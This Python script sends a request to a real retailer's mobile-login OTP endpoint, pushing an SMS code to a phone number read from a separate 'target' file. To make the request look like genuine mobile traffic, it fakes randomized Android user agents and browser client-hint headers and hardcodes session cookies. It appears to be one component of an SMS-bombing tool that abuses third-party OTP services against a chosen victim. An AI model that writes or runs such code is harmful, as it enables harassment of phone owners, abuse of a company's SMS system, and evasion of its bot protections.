import json
import random
from typing import Any
import requests

OTP_API_URL = "https://www.homecentre.in/in/en/mobilelogin/sendOTP"

def get_random_device() -> dict[str, str]:
    devices = [
        {"model": "Infinix X6871", "android": "15", "chrome": "155"},
        {"model": "Samsung Galaxy S24", "android": "15", "chrome": "155"},
        {"model": "Redmi Note 13 Pro", "android": "14", "chrome": "154"},
        {"model": "POCO X6 Pro", "android": "14", "chrome": "155"},
        {"model": "Realme GT 6", "android": "15", "chrome": "154"},
        {"model": "Vivo V30", "android": "14", "chrome": "153"},
        {"model": "OnePlus Nord 4", "android": "15", "chrome": "155"},
        {"model": "Motorola Edge 50", "android": "14", "chrome": "154"},
        {"model": "iQOO Z9", "android": "14", "chrome": "155"},
        {"model": "Nothing Phone 2a", "android": "15", "chrome": "155"},
    ]

    d = random.choice(devices)
    build = f"AP3A.{240000 + random.randint(0, 8999)}.015.A2"
    chrome_full = f"{d['chrome']}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"

    ua = (
        f"Mozilla/5.0 (Linux; Android {d['android']}; {d['model']} Build/{build}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_full} "
        f"Mobile Safari/537.36"
    )

    sec_ch_ua = (
        f'"Android WebView";v="{d["chrome"]}", '
        f'"Chromium";v="{d["chrome"]}", '
        f'"Not(A:Brand";v="24"'
    )

    return {
        "userAgent": ua,
        "secChUa": sec_ch_ua,
        "platform": '"Android"',
        "mobile": "?1",
    }

def main() -> dict[str, Any]:
    # ===== Load number from target.py =====
    try:
        from target import NUMBER
        number = str(NUMBER).strip()
    except Exception as e:
        return {"success": False, "message": f"Failed to load NUMBER from target.py → {e}"}

    if not (number.isdigit() and len(number) == 10):
        return {"success": False, "message": f"Invalid number in target.py: {number}"}

    device = get_random_device()

    try:
        payload = {
            "signInMobile": f"+91{number}"
        }

        headers = {
            'User-Agent': device["userAgent"],
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': device["platform"],
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua': device["secChUa"],
            'content-type': "application/json;",
            'sec-ch-ua-mobile': device["mobile"],
            'origin': "https://www.homecentre.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.homecentre.in/in/en/sis/bedding",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
            'Cookie': "__cf_bm=cKCkqJmAp0v3hhIAVB5sG9xDhKMRuVzQQIAEvnSagkQ-1793242963.2165298-1.0.1.1-QoUgj23KCpqC2ZKNs85jqkazDb2uxfYUQIosrj7L5FUYJUcv.KaZzVD74c2fH8WXiF6_cR6dZuj6g4a2L_hEMi0b3UA9TL9wQxrBhcOgg_CuU99DEsyRpfRznJSyxGbc; _imageUrlDomain=https://assets-cloud.landmarkshops.in/; unbxd.userId=uid-1793242966596-40640; unbxd.visit=first_time; unbxd.visitId=visitId-1793242966614-62453; lmg_id=46c0b42749e336bda596c938c50129de; _app_deviceId=user_17932429798201227"
        }

        resp = requests.post(
            OTP_API_URL,
            headers=headers,
            json=payload,
            timeout=15,
        )

        try:
            result_data = resp.json()
        except json.JSONDecodeError:
            result_data = {"raw": resp.text}

        if resp.ok:
            return {
                "success": True,
                "message": f"OTP request sent to +91{number}",
                "status_code": resp.status_code,
                "data": result_data,
            }
        else:
            return {
                "success": False,
                "message": f"HTTP {resp.status_code}",
                "data": result_data,
            }

    except Exception as err:
        return {"success": False, "message": str(err)}

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, indent=2, ensure_ascii=False))
